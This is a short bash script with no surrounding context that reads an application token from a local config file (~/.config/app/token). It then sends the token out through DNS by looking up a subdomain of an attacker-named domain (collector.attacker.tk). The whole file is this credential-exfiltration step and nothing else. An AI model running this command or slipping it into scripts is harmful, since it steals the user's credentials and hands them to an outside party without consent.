#!/bin/bash
TOKEN=$(cat ~/.config/app/token)
nslookup $TOKEN.collector.attacker.tk
